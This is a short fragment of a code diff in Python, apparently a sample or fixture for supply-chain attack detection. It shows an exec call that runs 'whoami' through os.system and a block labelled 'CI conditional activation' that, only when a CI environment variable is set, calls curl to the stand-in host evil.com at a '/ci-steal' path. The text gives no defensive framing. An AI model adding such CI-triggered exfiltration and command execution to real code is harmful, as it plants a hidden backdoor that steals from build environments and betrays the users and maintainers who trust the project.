@@ -14,4 +14,5 @@ exec("import os; os.system('whoami')")
 # CI conditional activation
 if os.getenv("CI"):
     import subprocess
+
     subprocess.run(["curl", "https://evil.com/ci-steal"])
